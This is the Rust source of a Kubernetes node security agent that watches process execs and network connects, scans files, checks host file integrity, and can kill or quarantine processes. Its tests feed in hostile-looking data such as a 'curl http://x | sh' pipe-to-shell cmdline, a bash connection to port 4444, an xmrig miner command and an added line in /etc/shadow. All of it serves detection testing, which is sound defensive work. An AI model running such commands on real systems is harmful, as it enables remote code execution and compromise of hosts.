//! The node agent: process events from eBPF or `/proc`, behavior rules,
//! file scanning, integrity monitoring, and autonomous response.

mod behavior;
#[cfg(any(target_os = "linux", test))]
mod btf;
mod client;
#[cfg(target_os = "linux")]
mod ebpf;
mod events;
mod integrity;
mod metrics;
mod pods;
mod process;
mod procfs;
mod report;
mod response;
mod scanner;
mod store;
#[cfg(any(target_os = "linux", test))]
mod tracefs;

use std::collections::{HashMap, HashSet};
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::atomic::AtomicBool;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::Context as _;
use chrono::Utc;
use prometheus_client::registry::Registry;
use tokio::sync::{mpsc, watch};

use crate::feed::oci::{Registry as OciRegistry, credentials};
use crate::k8s::{AgentStatus, Events, apply_lease};
use crate::observability::{Health, router, serve};
use crate::policy::{
    Detection, Engine as Kind, FileInfo, POLICY_FILE, Policy, Response, Severity, Workload,
};
use crate::rollout::{ROLLOUT_FILE, Rollout};

use self::events::{Exec, ProcessEvent};
use self::metrics::AgentMetrics;
use self::process::{Proc, ProcessTable};
use self::procfs::ProcFs;
use self::report::{Counters, Sinks};
use self::response::Blocker;
use self::scanner::{Finding, ScanCache, ScanRoot, kernel_dev};
use self::store::{ContentStore, Fetch};

#[derive(Clone, Debug)]
pub struct AgentArgs {
    pub node: String,
    pub namespace: String,
    pub instance: String,
    pub policy_dir: PathBuf,
    pub rollout_dir: PathBuf,
    pub state_dir: PathBuf,
    pub proc_root: PathBuf,
    pub manager_url: Option<String>,
    pub tls_dir: PathBuf,
    pub registry_auth: Option<PathBuf>,
    pub health_addr: SocketAddr,
    pub tracefs: PathBuf,
    pub btf: PathBuf,
}

const RELOAD_EVERY: Duration = Duration::from_secs(10);
const LEASE_EVERY: Duration = Duration::from_secs(30);
const FIRST_FULL_SCAN: Duration = Duration::from_mins(2);

fn read_json<T: serde::de::DeserializeOwned + Default>(path: &Path) -> T {
    std::fs::read(path)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default()
}

/// Shared state of the event handlers.
struct Ctx {
    node: String,
    proc: ProcFs,
    state: PathBuf,
    policy: watch::Receiver<Policy>,
    store: Arc<ContentStore>,
    table: Mutex<ProcessTable>,
    pods: pods::PodIndex,
    blocker: Option<Arc<dyn Blocker>>,
    cache: Mutex<ScanCache>,
    own: Mutex<HashSet<i32>>,
    metrics: AgentMetrics,
    tx: mpsc::Sender<(Detection, String)>,
}

impl Ctx {
    fn policy(&self) -> Policy {
        self.policy.borrow().clone()
    }

    fn content(&self) -> String {
        self.store.active().unwrap_or_else(|| "builtin".into())
    }

    async fn emit(&self, d: Detection) {
        let _ = self.tx.send((d, self.content())).await;
    }

    fn workload(&self, container_id: &str) -> Workload {
        self.pods.lookup(container_id).unwrap_or_else(|| Workload {
            container_id: container_id.to_string(),
            ..Workload::default()
        })
    }

    /// The agent's own processes and excluded namespaces are skipped by
    /// every engine. Neither can be changed from inside a container.
    fn excluded(&self, p: &Proc, w: Option<&Workload>, policy: &Policy) -> bool {
        self.own
            .lock()
            .is_ok_and(|o| o.contains(&p.pid) || o.contains(&p.ppid))
            || w.is_some_and(|w| !w.namespace.is_empty() && policy.namespace_excluded(&w.namespace))
    }

    fn kill_tree(&self, pid: i32, descendants: bool, d: &mut Detection) {
        let mut pids = vec![pid];
        if descendants && let Ok(t) = self.table.lock() {
            pids.extend(t.descendants(pid));
        }
        let mut errors = Vec::new();
        for p in pids {
            if let Err(e) = response::kill(p) {
                errors.push(e);
            }
        }
        d.actions.push(Response::Kill);
        if !errors.is_empty() {
            let mut all: Vec<String> = d.action_error.take().into_iter().collect();
            all.extend(errors);
            d.action_error = Some(all.join("; "));
        }
    }

    fn quarantine_and_block(
        &self,
        f: &Finding,
        kernel_inode: Option<(u64, u64)>,
        d: &mut Detection,
    ) {
        let mut errors: Vec<String> = d.action_error.take().into_iter().collect();
        match response::quarantine(&f.root, &f.file.path, f.inode, &self.state, &f.found.sha256) {
            Ok(_) => d.actions.push(Response::Quarantine),
            Err(e) => errors.push(e),
        }
        if let Some(b) = &self.blocker {
            let (dev, ino) = kernel_inode.unwrap_or_else(|| (kernel_dev(f.inode.0), f.inode.1));
            match b.block(dev, ino) {
                Ok(()) => {
                    d.actions.push(Response::Block);
                    #[allow(clippy::cast_possible_wrap)]
                    self.metrics.blocklist_entries.set(b.entries() as i64);
                }
                Err(e) => errors.push(e),
            }
        }
        if !errors.is_empty() {
            d.action_error = Some(errors.join("; "));
        }
    }

    fn proc_from_exec(&self, e: &Exec) -> Proc {
        let stat = self.proc.stat(e.pid);
        Proc {
            pid: e.pid,
            ppid: e
                .ppid
                .or_else(|| stat.as_ref().map(|s| s.ppid))
                .unwrap_or(0),
            comm: if e.comm.is_empty() {
                stat.map(|s| s.comm).unwrap_or_default()
            } else {
                e.comm.clone()
            },
            exe: self
                .proc
                .exe(e.pid)
                .or_else(|| (!e.filename.is_empty()).then(|| e.filename.clone())),
            cmdline: e.args.clone().unwrap_or_else(|| self.proc.cmdline(e.pid)),
            uid: e.uid.or_else(|| self.proc.uid(e.pid)),
            container_id: self.proc.container_id(e.pid),
        }
    }

    async fn on_exec(self: &Arc<Self>, e: Exec) {
        let p = self.proc_from_exec(&e);
        let parent = self.table.lock().ok().and_then(|t| t.get(p.ppid).cloned());
        if let Ok(mut t) = self.table.lock() {
            t.insert(p.clone());
        }
        let policy = self.policy();
        let workload = p.container_id.as_deref().map(|id| self.workload(id));
        if self.excluded(&p, workload.as_ref(), &policy) {
            return;
        }
        let info = self.table.lock().ok().and_then(|t| t.info(p.pid));

        let killed = policy.scan.on_exec
            && self
                .scan_exec(&e, &p, info.clone(), workload.clone(), &policy)
                .await;
        if policy.behavior.enabled && !policy.process_excluded(p.exe.as_deref()) {
            let socket = self.proc.stdio_socket(p.pid);
            for hit in
                behavior::on_exec(&p, parent.as_ref(), socket, &policy.behavior.disabled_rules)
            {
                let mut d = Detection::new(
                    &self.node,
                    Kind::Behavior,
                    hit.rule.id(),
                    hit.severity,
                    hit.description,
                );
                d.process.clone_from(&info);
                d.workload.clone_from(&workload);
                if policy.protect() && hit.severity >= Severity::High && !killed {
                    self.kill_tree(p.pid, hit.severity == Severity::Critical, &mut d);
                }
                self.emit(d).await;
            }
        }
    }

    /// Scans the executable, and the script when the exec ran one through
    /// an interpreter. The quarantine happens before the kill, while
    /// `/proc/<pid>/root` still resolves. Returns whether it killed.
    async fn scan_exec(
        self: &Arc<Self>,
        e: &Exec,
        p: &Proc,
        info: Option<crate::policy::ProcessInfo>,
        workload: Option<Workload>,
        policy: &Policy,
    ) -> bool {
        let mut targets = vec![(self.proc.exe_path(p.pid), p.exe.clone(), true)];
        if !e.filename.is_empty() && Some(&e.filename) != p.exe.as_ref() {
            let script = self
                .proc
                .root_path(p.pid)
                .join(e.filename.trim_start_matches('/'));
            targets.push((script, Some(e.filename.clone()), false));
        }
        for (path, shown, is_exe) in targets {
            let ctx = self.clone();
            let max = policy.scan.max_file_size_bytes;
            let found = tokio::task::spawn_blocking(move || {
                let engine = ctx.store.engine();
                let mut scanner = engine.scanner();
                ctx.metrics.scanned("exec");
                scanner::scan_path(&mut scanner, &engine.revision, &ctx.cache, &path, max)
            })
            .await
            .ok()
            .flatten();
            let Some((m, mut file, inode)) = found else {
                continue;
            };
            file.path = shown.unwrap_or(file.path);
            let mut d = Detection::new(
                &self.node,
                Kind::Signature,
                &m.name,
                m.severity,
                m.description.clone(),
            );
            d.process.clone_from(&info);
            d.workload.clone_from(&workload);
            d.file = Some(file.clone());
            let protect = policy.protect() && m.severity >= Severity::High;
            if protect {
                let finding = Finding {
                    found: m,
                    file,
                    root: self.proc.root_path(p.pid),
                    workload: workload.clone(),
                    inode,
                };
                let kernel = (is_exe && e.dev != 0).then_some((e.dev, e.ino));
                self.quarantine_and_block(&finding, kernel, &mut d);
                self.kill_tree(p.pid, false, &mut d);
            }
            self.emit(d).await;
            return protect;
        }
        false
    }

    async fn on_connect(&self, pid: i32, addr: std::net::IpAddr, port: u16) {
        let policy = self.policy();
        if !policy.behavior.enabled {
            return;
        }
        let p = self.table.lock().ok().and_then(|t| t.get(pid).cloned());
        let p = p.unwrap_or_else(|| {
            self.proc_from_exec(&Exec {
                pid,
                ..Exec::default()
            })
        });
        let workload = p.container_id.as_deref().map(|id| self.workload(id));
        if self.excluded(&p, workload.as_ref(), &policy)
            || policy.process_excluded(p.exe.as_deref())
        {
            return;
        }
        let socket = self.proc.stdio_socket(pid);
        let target = SocketAddr::new(addr, port).to_string();
        for hit in behavior::on_connect(&p, socket, &target, &policy.behavior.disabled_rules) {
            let mut d = Detection::new(
                &self.node,
                Kind::Behavior,
                hit.rule.id(),
                hit.severity,
                hit.description,
            );
            d.process = self.table.lock().ok().and_then(|t| t.info(pid));
            d.workload.clone_from(&workload);
            if policy.protect() && hit.severity >= Severity::High {
                self.kill_tree(pid, hit.severity == Severity::Critical, &mut d);
            }
            self.emit(d).await;
        }
    }

    async fn on_blocked(&self, pid: i32, comm: String, denied: bool) {
        let container = self.proc.container_id(pid);
        let mut d = Detection::new(
            &self.node,
            Kind::Signature,
            "exec-blocked",
            Severity::High,
            format!("{comm} tried to execute a blocklisted file"),
        );
        d.process = Some(crate::policy::ProcessInfo {
            pid,
            comm,
            cmdline: self.proc.cmdline(pid),
            ..Default::default()
        });
        d.workload = container.as_deref().map(|id| self.workload(id));
        d.actions = if denied {
            vec![Response::Block]
        } else {
            vec![Response::Alert]
        };
        self.emit(d).await;
    }

    async fn handle(self: &Arc<Self>, ev: ProcessEvent) {
        self.metrics.event(ev.kind());
        match ev {
            ProcessEvent::Exec(e) => self.on_exec(e).await,
            ProcessEvent::Exit { pid } => {
                if let Ok(mut t) = self.table.lock() {
                    t.remove(pid);
                }
            }
            ProcessEvent::Connect {
                pid, addr, port, ..
            } => self.on_connect(pid, addr, port).await,
            ProcessEvent::Blocked {
                pid, comm, denied, ..
            } => self.on_blocked(pid, comm, denied).await,
        }
    }

    /// One root per container seen on the node, plus the host paths.
    fn scan_roots(&self, policy: &Policy) -> Vec<ScanRoot> {
        let mut by_container: HashMap<String, i32> = HashMap::new();
        if let Ok(t) = self.table.lock() {
            for pid in self.proc.pids() {
                if let Some(id) = t.get(pid).and_then(|p| p.container_id.clone()) {
                    by_container.entry(id).or_insert(pid);
                }
            }
        }
        let mut roots: Vec<ScanRoot> = by_container
            .into_iter()
            .filter_map(|(id, pid)| {
                let w = Some(self.workload(&id));
                if w.as_ref()
                    .is_some_and(|w| policy.namespace_excluded(&w.namespace))
                {
                    return None;
                }
                Some(ScanRoot {
                    base: self.proc.root_path(pid),
                    dirs: vec!["/".into()],
                    workload: w,
                })
            })
            .collect();
        if !policy.scan.host_paths.is_empty() {
            roots.push(ScanRoot {
                base: self.proc.host_root(),
                dirs: policy.scan.host_paths.clone(),
                workload: None,
            });
        }
        roots
    }

    async fn full_scan(self: &Arc<Self>, cancel: Arc<AtomicBool>) {
        let policy = self.policy();
        let roots = self.scan_roots(&policy);
        let ctx = self.clone();
        let p2 = policy.clone();
        let started = std::time::Instant::now();
        let findings = tokio::task::spawn_blocking(move || {
            let engine = ctx.store.engine();
            scanner::full_scan(&engine, &roots, &p2, &ctx.cache, &cancel, &|| {
                ctx.metrics.scanned("full");
            })
        })
        .await
        .unwrap_or_default();
        self.metrics
            .full_scan_duration
            .observe(started.elapsed().as_secs_f64());
        for f in findings {
            let mut d = Detection::new(
                &self.node,
                Kind::Signature,
                &f.found.name,
                f.found.severity,
                f.found.description.clone(),
            );
            d.file = Some(f.file.clone());
            d.workload.clone_from(&f.workload);
            if policy.protect() && f.found.severity >= Severity::High {
                self.quarantine_and_block(&f, None, &mut d);
            }
            self.emit(d).await;
        }
    }

    async fn integrity(&self, baseline: &mut Option<integrity::Baseline>) {
        let policy = self.policy();
        if !policy.integrity.enabled {
            return;
        }
        let host = self.proc.host_root();
        let paths = policy.integrity.paths.clone();
        let Ok(now) = tokio::task::spawn_blocking(move || integrity::snapshot(&host, &paths)).await
        else {
            return;
        };
        if let Some(old) = baseline.as_ref() {
            for (path, change) in integrity::diff(old, &now) {
                let severity = if ["shadow", "sudoers", "ld.so.preload", "authorized_keys"]
                    .iter()
                    .any(|s| path.contains(s))
                {
                    Severity::High
                } else {
                    Severity::Medium
                };
                let mut d = Detection::new(
                    &self.node,
                    Kind::Integrity,
                    "file-integrity",
                    severity,
                    format!("host file {path} {}", change.as_str()),
                );
                d.file = Some(FileInfo {
                    sha256: now.get(&path).cloned(),
                    path,
                    size: None,
                });
                self.emit(d).await;
            }
        }
        if let Err(e) = integrity::save(&self.state, &now) {
            tracing::warn!(error = %e, "save integrity baseline");
        }
        *baseline = Some(now);
    }
}

/// Polls `/proc` for new and exited processes.
async fn poll_procfs(
    proc: ProcFs,
    tx: mpsc::Sender<ProcessEvent>,
    policy: watch::Receiver<Policy>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut known: HashSet<i32> = HashSet::new();
    loop {
        let interval = Duration::from_millis(policy.borrow().behavior.poll_interval_ms.max(100));
        let now: HashSet<i32> = proc.pids().into_iter().collect();
        for pid in now.difference(&known) {
            let _ = tx
                .send(ProcessEvent::Exec(Exec {
                    pid: *pid,
                    ..Exec::default()
                }))
                .await;
        }
        for pid in known.difference(&now) {
            let _ = tx.send(ProcessEvent::Exit { pid: *pid }).await;
        }
        known = now;
        tokio::select! {
            () = tokio::time::sleep(interval) => {}
            _ = shutdown.changed() => return,
        }
    }
}

/// Starts the event source the policy asks for. Returns the mode label and
/// the exec blocker when the BPF LSM is attached.
fn start_source(
    args: &AgentArgs,
    policy: &watch::Receiver<Policy>,
    tx: mpsc::Sender<ProcessEvent>,
    metrics: &AgentMetrics,
    shutdown: watch::Receiver<bool>,
) -> (String, Option<Arc<dyn Blocker>>) {
    let want = policy.borrow().event_source;
    #[cfg(target_os = "linux")]
    if want != crate::crd::EventSource::Procfs {
        match ebpf::load(&args.btf, &args.tracefs, tx.clone(), metrics.clone()) {
            Ok(k) => {
                let mode = k.mode().to_string();
                tracing::info!(mode, "eBPF probes attached");
                let blocker: Option<Arc<dyn Blocker>> =
                    k.lsm.then(|| k.clone() as Arc<dyn Blocker>);
                std::mem::forget(k);
                return (mode, blocker);
            }
            Err(e) if want == crate::crd::EventSource::Ebpf => {
                tracing::error!(error = %e, "eventSource is Ebpf and the probes failed to load, polling /proc instead");
            }
            Err(e) => tracing::warn!(error = %e, "eBPF unavailable, polling /proc"),
        }
    }
    #[cfg(not(target_os = "linux"))]
    let _ = (&args.btf, &args.tracefs, want, metrics);
    tokio::spawn(poll_procfs(
        ProcFs::new(&args.proc_root),
        tx,
        policy.clone(),
        shutdown,
    ));
    ("procfs".into(), None)
}

/// A manager client for other modules' tests.
#[cfg(test)]
pub fn client_for_tests(url: &str, tls: &Path, node: &str) -> client::ManagerClient {
    client::ManagerClient::new(url, tls, node).unwrap()
}

#[allow(clippy::too_many_lines)]
pub async fn run(args: AgentArgs, shutdown: watch::Receiver<bool>) -> anyhow::Result<()> {
    let started = Utc::now();
    let mut registry = Registry::default();
    let metrics = AgentMetrics::register(&mut registry);
    let health = Health::new(registry);
    tokio::spawn(serve(
        args.health_addr,
        router(health.clone()),
        shutdown.clone(),
    ));

    let policy_path = args.policy_dir.join(POLICY_FILE);
    let rollout_path = args.rollout_dir.join(ROLLOUT_FILE);
    let (policy_tx, policy_rx) = watch::channel(read_json::<Policy>(&policy_path));
    let (rollout_tx, mut rollout_rx) = watch::channel(read_json::<Rollout>(&rollout_path));

    let kube = crate::k8s::client().await.ok();
    if kube.is_none() {
        tracing::warn!("no Kubernetes API access, Events, Pod names, and the Lease are off");
    }
    let pods = kube.clone().map_or_else(pods::PodIndex::empty, |c| {
        pods::PodIndex::start(c, &args.node)
    });
    let store = Arc::new(ContentStore::new(&args.state_dir));
    let manager = match &args.manager_url {
        Some(url) => Some(Arc::new(
            client::ManagerClient::new(url, &args.tls_dir, &args.node).context("manager TLS")?,
        )),
        None => None,
    };
    let fetch = match &manager {
        Some(m) => Fetch::Manager(m.clone()),
        None => {
            let creds = args.registry_auth.as_ref().and_then(|p| {
                let cfg = std::fs::read(p).ok()?;
                let image = policy_rx.borrow().feed.as_ref()?.image.clone();
                let reference = crate::feed::oci::Reference::parse(&image).ok()?;
                credentials(&cfg, &reference.registry)
            });
            OciRegistry::new(creds).map_or(Fetch::None, Fetch::Registry)
        }
    };
    if let Some(lkg) = store.last_known_good() {
        let p = policy_rx.borrow().clone();
        if let Err(e) = store.sync(Some(&lkg), &p, &Fetch::None).await {
            tracing::warn!(error = %e, "last known good database did not load");
        }
    }

    let (ev_tx, mut ev_rx) = mpsc::channel::<ProcessEvent>(8192);
    let (det_tx, det_rx) = mpsc::channel::<(Detection, String)>(4096);
    let (mode, blocker) =
        start_source(&args, &policy_rx, ev_tx.clone(), &metrics, shutdown.clone());
    let proc = ProcFs::new(&args.proc_root);
    let own = proc.descendants_of(i32::try_from(std::process::id()).unwrap_or(0));
    let counters = Arc::new(Counters::default());
    let ctx = Arc::new(Ctx {
        node: args.node.clone(),
        proc: proc.clone(),
        state: args.state_dir.clone(),
        policy: policy_rx.clone(),
        store: store.clone(),
        table: Mutex::new(ProcessTable::default()),
        pods,
        blocker: blocker.clone(),
        cache: Mutex::new(ScanCache::default()),
        own: Mutex::new(own),
        metrics: metrics.clone(),
        tx: det_tx,
    });

    tokio::spawn(report::run(
        det_rx,
        Sinks {
            events: kube
                .clone()
                .filter(|_| policy_rx.borrow().emit_events)
                .map(|c| Events::new(c, "ward-agent", Some(args.node.clone()))),
            manager: manager.clone(),
            metrics: metrics.clone(),
            counters: counters.clone(),
        },
        shutdown.clone(),
    ));

    if mode != "procfs" {
        for pid in proc.pids() {
            let _ = ev_tx
                .send(ProcessEvent::Exec(Exec {
                    pid,
                    ..Exec::default()
                }))
                .await;
        }
    }
    let handler = ctx.clone();
    tokio::spawn(async move {
        while let Some(ev) = ev_rx.recv().await {
            handler.handle(ev).await;
        }
    });

    {
        let (ctx, policy_path, rollout_path) =
            (ctx.clone(), policy_path.clone(), rollout_path.clone());
        let mut shutdown = shutdown.clone();
        let blocker = blocker.clone();
        let node = args.node.clone();
        let metrics = metrics.clone();
        let mode = mode.clone();
        tokio::spawn(async move {
            let mut last_policy = String::new();
            loop {
                let p = read_json::<Policy>(&policy_path);
                let r = read_json::<Rollout>(&rollout_path);
                if p.revision() != last_policy {
                    last_policy = p.revision();
                    if let Some(b) = &blocker
                        && let Err(e) = b.set_enforce(p.protect())
                    {
                        tracing::warn!(error = %e, "set exec enforcement");
                    }
                    let _ = policy_tx.send(p.clone());
                }
                rollout_tx.send_if_modified(|cur| {
                    if *cur == r {
                        false
                    } else {
                        *cur = r.clone();
                        true
                    }
                });
                let assigned = r.assigned(&node).cloned();
                match ctx.store.sync(assigned.as_ref(), &p, &fetch).await {
                    Ok(true) => {
                        metrics.swap(true);
                        tracing::info!(revision = %ctx.store.engine().revision, "signature database loaded");
                    }
                    Ok(false) => {}
                    Err(e) => {
                        metrics.swap(false);
                        tracing::warn!(error = %e, "signature database rejected, keeping the running one");
                    }
                }
                metrics.content(&ctx.store.engine().revision, &mode);
                tokio::select! {
                    () = tokio::time::sleep(RELOAD_EVERY) => {}
                    _ = rollout_rx.changed() => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    {
        let ctx = ctx.clone();
        let mut shutdown = shutdown.clone();
        tokio::spawn(async move {
            tokio::time::sleep(FIRST_FULL_SCAN).await;
            loop {
                let cancel = Arc::new(AtomicBool::new(false));
                ctx.full_scan(cancel).await;
                let secs = ctx.policy().scan.interval_secs.max(60);
                tokio::select! {
                    () = tokio::time::sleep(Duration::from_secs(secs)) => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    {
        let ctx = ctx.clone();
        let mut shutdown = shutdown.clone();
        tokio::spawn(async move {
            let mut baseline = integrity::load(&ctx.state);
            loop {
                ctx.integrity(&mut baseline).await;
                let secs = ctx.policy().integrity.interval_secs.max(10);
                tokio::select! {
                    () = tokio::time::sleep(Duration::from_secs(secs)) => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    if let Some(client) = kube {
        let mut shutdown = shutdown.clone();
        let (store, counters, policy) = (store.clone(), counters.clone(), policy_rx.clone());
        let (node, ns, instance) = (
            args.node.clone(),
            args.namespace.clone(),
            args.instance.clone(),
        );
        tokio::spawn(async move {
            loop {
                let status = AgentStatus {
                    node: node.clone(),
                    version: env!("CARGO_PKG_VERSION").into(),
                    event_source: mode.clone(),
                    policy_revision: policy.borrow().revision(),
                    content_digest: store.active(),
                    content_error: store.error(),
                    detections: counters.total(),
                    detections_by_content: counters.by_content(),
                    started_at: Some(started),
                };
                if let Err(e) =
                    apply_lease(&client, &ns, &status.lease(&instance, Utc::now())).await
                {
                    tracing::warn!(error = %e, "write agent lease");
                }
                tokio::select! {
                    () = tokio::time::sleep(LEASE_EVERY) => {}
                    _ = shutdown.changed() => return,
                }
            }
        });
    }

    health.set_ready(true);
    tracing::info!(node = %args.node, "agent running");
    crate::observability::stopped(shutdown).await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use std::time::Duration;

    use prometheus_client::registry::Registry;

    use super::procfs::tests::{CID, FakeProc};
    use super::*;
    use crate::content::tests::eicar;

    fn ctx(
        fake: &FakeProc,
        state: &Path,
        policy: Policy,
    ) -> (Arc<Ctx>, mpsc::Receiver<(Detection, String)>) {
        let (tx, rx) = mpsc::channel(64);
        let (_ptx, prx) = watch::channel(policy);
        let ctx = Arc::new(Ctx {
            node: "node-a".into(),
            proc: fake.fs(),
            state: state.to_path_buf(),
            policy: prx,
            store: Arc::new(ContentStore::new(state)),
            table: Mutex::new(ProcessTable::default()),
            pods: pods::PodIndex::empty(),
            blocker: Some(Arc::new(response::tests::FakeBlocker::default())),
            cache: Mutex::new(ScanCache::default()),
            own: Mutex::new(HashSet::new()),
            metrics: AgentMetrics::register(&mut Registry::default()),
            tx,
        });
        (ctx, rx)
    }

    fn drain(rx: &mut mpsc::Receiver<(Detection, String)>) -> Vec<Detection> {
        let mut out = Vec::new();
        while let Ok((d, _)) = rx.try_recv() {
            out.push(d);
        }
        out
    }

    #[tokio::test]
    async fn exec_events_raise_behavior_and_signature_detections() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(
            10,
            1,
            "java",
            "elf",
            "java -jar app.jar",
            &format!("0::/kubepods/pod1/{CID}"),
        );
        fake.add(
            11,
            10,
            "sh",
            "elf",
            "sh -c curl http://x | sh",
            &format!("0::/kubepods/pod1/{CID}"),
        );
        fake.add(
            12,
            1,
            "x",
            std::str::from_utf8(&eicar()).unwrap(),
            "x",
            "0::/",
        );
        let mut policy = Policy::default();
        policy.behavior.enabled = true;
        policy.scan.on_exec = true;
        policy.scan.max_file_size_bytes = 1 << 20;
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        for pid in [10, 11, 12] {
            ctx.handle(ProcessEvent::Exec(Exec {
                pid,
                ..Exec::default()
            }))
            .await;
        }
        let d = drain(&mut rx);
        let rules: Vec<&str> = d.iter().map(|d| d.rule.as_str()).collect();
        assert!(rules.contains(&"webserver-shell"), "{rules:?}");
        assert!(rules.contains(&"pipe-to-shell"), "{rules:?}");
        assert!(rules.contains(&"Ward.Test.EICAR"), "{rules:?}");
        let shell = d.iter().find(|d| d.rule == "pipe-to-shell").unwrap();
        assert_eq!(shell.workload.as_ref().unwrap().container_id, CID);
        assert_eq!(
            shell.process.as_ref().unwrap().storyline,
            vec!["10:java", "1:?"]
        );
        assert!(
            d.iter().all(|d| d.actions == vec![Response::Alert]),
            "detect mode only alerts"
        );

        ctx.handle(ProcessEvent::Exit { pid: 11 }).await;
        assert!(ctx.table.lock().unwrap().get(11).is_none());
    }

    #[tokio::test]
    async fn connect_blocked_and_exclusions() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(20, 1, "bash", "elf", "bash", "0::/");
        fake.add(21, 1, "bash", "elf", "bash", "0::/");
        let mut policy = Policy::default();
        policy.behavior.enabled = true;
        policy.exclusions.processes = vec!["/opt/ignored".into()];
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        ctx.handle(ProcessEvent::Connect {
            pid: 20,
            uid: 0,
            comm: "bash".into(),
            addr: "10.0.0.1".parse().unwrap(),
            port: 4444,
        })
        .await;
        ctx.handle(ProcessEvent::Blocked {
            pid: 21,
            uid: 0,
            comm: "bad".into(),
            dev: 1,
            ino: 2,
            denied: true,
        })
        .await;
        let d = drain(&mut rx);
        assert_eq!(d[0].rule, "shell-network-connect");
        assert!(d[0].description.contains("10.0.0.1:4444"));
        assert_eq!(d[1].rule, "exec-blocked");
        assert_eq!(d[1].actions, vec![Response::Block]);

        ctx.own.lock().unwrap().insert(20);
        ctx.handle(ProcessEvent::Connect {
            pid: 20,
            uid: 0,
            comm: "bash".into(),
            addr: "10.0.0.1".parse().unwrap(),
            port: 1,
        })
        .await;
        assert!(drain(&mut rx).is_empty());
    }

    #[tokio::test]
    async fn protect_mode_kills_and_reports_errors() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        // Above any pid_max, so the kill can never reach a real process.
        let pid = i32::MAX - 1;
        fake.add(
            pid,
            1,
            "xmrig",
            "elf",
            "xmrig -o stratum+tcp://pool",
            "0::/",
        );
        let mut policy = Policy {
            mode: crate::crd::Mode::Protect,
            ..Policy::default()
        };
        policy.behavior.enabled = true;
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        ctx.handle(ProcessEvent::Exec(Exec {
            pid,
            ..Exec::default()
        }))
        .await;
        let d = drain(&mut rx);
        let miner = d.iter().find(|d| d.rule == "crypto-miner").unwrap();
        assert!(miner.actions.contains(&Response::Kill));
        assert!(
            miner.action_error.is_some(),
            "the pid is not a real process"
        );
    }

    #[tokio::test]
    async fn full_scan_and_integrity() {
        let fake = FakeProc::new();
        let state = tempfile::tempdir().unwrap();
        fake.add(1, 0, "init", "elf", "init", "0::/");
        fake.add(
            40,
            1,
            "app",
            "elf",
            "app",
            &format!("0::/kubepods/pod1/{CID}"),
        );
        let root = fake.dir.path().join("40/root");
        std::fs::create_dir_all(root.join("srv")).unwrap();
        std::fs::write(root.join("srv/eicar.com"), eicar()).unwrap();
        let host = fake.dir.path().join("1/root/etc");
        std::fs::create_dir_all(&host).unwrap();
        std::fs::write(host.join("shadow"), "root:x").unwrap();
        let mut policy = Policy::default();
        policy.scan.max_file_size_bytes = 1 << 20;
        policy.integrity.enabled = true;
        policy.integrity.paths = vec!["/etc/shadow".into()];
        let (ctx, mut rx) = ctx(&fake, state.path(), policy);
        ctx.handle(ProcessEvent::Exec(Exec {
            pid: 40,
            ..Exec::default()
        }))
        .await;
        drain(&mut rx);
        assert_eq!(ctx.scan_roots(&ctx.policy()).len(), 1);
        ctx.full_scan(Arc::new(AtomicBool::new(false))).await;
        let d = drain(&mut rx);
        assert_eq!(d.len(), 1);
        assert_eq!(d[0].file.as_ref().unwrap().path, "/srv/eicar.com");

        let mut baseline = None;
        ctx.integrity(&mut baseline).await;
        assert!(drain(&mut rx).is_empty());
        std::fs::write(host.join("shadow"), "root:x\nevil:x").unwrap();
        ctx.integrity(&mut baseline).await;
        let d = drain(&mut rx);
        assert_eq!(d[0].rule, "file-integrity");
        assert_eq!(d[0].severity, Severity::High);
        assert!(integrity::load(state.path()).is_some());
    }

    #[tokio::test]
    async fn procfs_poller_reports_new_and_gone() {
        let fake = FakeProc::new();
        fake.add(50, 1, "a", "elf", "a", "0::/");
        let (tx, mut rx) = mpsc::channel(16);
        let mut p = Policy::default();
        p.behavior.poll_interval_ms = 100;
        let (_ptx, prx) = watch::channel(p);
        let (stop_tx, stop_rx) = watch::channel(false);
        let task = tokio::spawn(poll_procfs(fake.fs(), tx, prx, stop_rx));
        let first = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .unwrap()
            .unwrap();
        assert!(matches!(first, ProcessEvent::Exec(Exec { pid: 50, .. })));
        std::fs::remove_dir_all(fake.dir.path().join("50")).unwrap();
        let gone = tokio::time::timeout(Duration::from_secs(2), rx.recv())
            .await
            .unwrap()
            .unwrap();
        assert_eq!(gone, ProcessEvent::Exit { pid: 50 });
        stop_tx.send(true).unwrap();
        task.await.unwrap();
        assert_eq!(
            read_json::<Policy>(Path::new("/nonexistent")),
            Policy::default()
        );
    }
}
